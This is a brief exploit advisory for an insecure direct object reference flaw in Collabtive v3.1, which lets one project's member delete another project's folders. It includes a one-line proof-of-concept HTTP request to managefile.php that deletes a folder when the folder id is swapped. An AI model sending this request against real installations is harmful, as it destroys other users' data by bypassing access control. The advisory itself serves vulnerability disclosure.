# Exploit Title: Collabtive v3.1 - Insecure Direct Object Reference(IDOR)
## Date: 1/4/2024
## Vendor Homepage: https://github.com/philippK-de/Collabtive
## Tested on: Debian Linux, Apache, Mysql
## Vendor: philippK-de
## Version: v3.1
## Exploit Description:
## Collabtive v3.1 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to delete the folder that owned by other project(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /managefile.php?action=delfolder&id=1(ATTACK'S PROJECT ID)&folder=3(CHANGE HERE)&ajax=1 HTTP/1.1
```